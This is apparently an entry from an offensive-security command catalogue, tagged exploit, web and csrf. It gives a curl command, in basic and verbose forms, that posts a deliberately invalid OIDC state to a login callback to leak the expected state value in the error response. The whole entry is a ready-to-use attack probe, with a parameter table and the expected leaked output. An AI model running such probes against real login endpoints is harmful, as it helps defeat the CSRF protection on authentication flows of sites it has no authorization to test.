---
id: cmd-002
name: curl-mismatched-state
type: command
executor: bash
data: >-
  curl -b cookies.txt -X POST
  "https://target.com/index.php/login?openIdConnect=callback" -d
  "state=invalid_state&code=some_code" -H "Content-Type:
  application/x-www-form-urlencoded" -o error.json
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.567Z'
platforms:
  - Linux
  - macOS
  - Web
tags:
  - exploit
  - web
  - csrf
verified: false
validated: true
submitted: true
---

# curl-mismatched-state

## Command

```bash
curl -b cookies.txt -X POST "https://target.com/index.php/login?openIdConnect=callback" -d "state=invalid_state&code=some_code" -H "Content-Type: application/x-www-form-urlencoded" -o error.json
```

## Description

Triggers a state mismatch on the OIDC callback to leak the expected state in the error response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Load cookies | Yes |
| `-X POST` | HTTP method | Yes |
| `-d` | Form data with invalid state | Yes |
| `-H` | Content type header | Yes |
| `-o error.json` | Save output | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt -X POST "https://target.com/index.php/login?openIdConnect=callback" -d "state=invalid_state&code=some_code" -H "Content-Type: application/x-www-form-urlencoded" -o error.json
```

### Advanced Usage

```bash
curl -b cookies.txt -X POST -v "https://target.com/index.php/login?openIdConnect=callback" -d "state=invalid_state&code=some_code" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

JSON error: {"error":"Invalid state","expected_state":"leaked_value"}.

## Related

- [[Related Procedure]]
